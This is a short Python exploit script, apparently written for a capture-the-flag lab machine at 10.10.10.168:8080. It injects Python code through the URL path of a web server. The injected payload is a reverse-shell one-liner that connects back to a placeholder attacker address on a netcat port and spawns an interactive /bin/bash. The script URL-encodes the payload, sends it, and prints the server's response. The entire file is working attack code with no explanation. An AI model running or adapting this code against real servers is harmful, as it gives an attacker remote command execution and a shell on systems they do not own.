#!/usr/bin/env python3
import requests
import urllib
import os

url='http://10.10.10.168:8080/'

path='5\''+'\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR tun0 IP ADDRESS",YOUR NETCAT PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"])\na=\''
print('Inital shell code:')
# print(path+'\n')
payload=urllib.parse.quote(path)

print('Payload quoted:')
print(url+payload)
# os.system('http GET {}{}'.format(url, path))

resp=requests.get(url+payload)
print(resp.headers)
print(resp.text)
